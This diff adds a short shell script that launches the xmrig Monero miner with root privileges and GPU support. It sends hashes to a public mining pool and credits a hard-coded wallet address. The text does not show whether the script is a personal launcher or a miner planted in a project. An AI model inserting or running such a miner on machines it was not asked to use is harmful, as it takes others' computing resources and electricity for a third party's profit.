@@ -1,0 +1,3 @@
+#!/usr/bin/sh
+
+sudo xmrig --cuda --print-time 30 --donate-level 0 -o pool.supportxmr.com:5555 -u 47z353DVtHkGTamcj7KYPtPsuCn481HAbL3uR2PLgxdQ2QYYJuwYmHcaQVRiFbGnaxDU2jKZTyMr15dx2HEuYhP471jsioW -p galileo -k
